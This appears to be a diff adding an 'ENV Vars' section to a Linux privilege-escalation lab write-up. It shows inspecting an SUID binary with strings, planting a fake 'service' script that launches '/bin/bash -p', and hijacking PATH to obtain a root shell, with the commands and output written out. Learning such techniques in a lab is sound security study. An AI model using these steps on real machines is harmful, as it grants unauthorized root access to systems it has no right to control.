@@ -75,3 +75,42 @@ Warning: truncating password to 8 characters
 LHD3iy7IoLObw
 ```
 Replace the 'x' in the root line
+
+# ENV Vars
+```
+user@debian:~$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+user@debian:~$ mv jake service
+user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
+root@debian:~#
+root@debian:~# whoami
+root
+root@debian:~# ls
+```
+
+We can see that it uses several apps as root. Let's make our own binary called `service`
+
+```
+cat service
+#!/bin/bash
+/bin/bash -p
+```
+
+Now let's set our path and run our exe:
+```
+PATH=.:$PATH /usr/local/bin/suid-env
+```
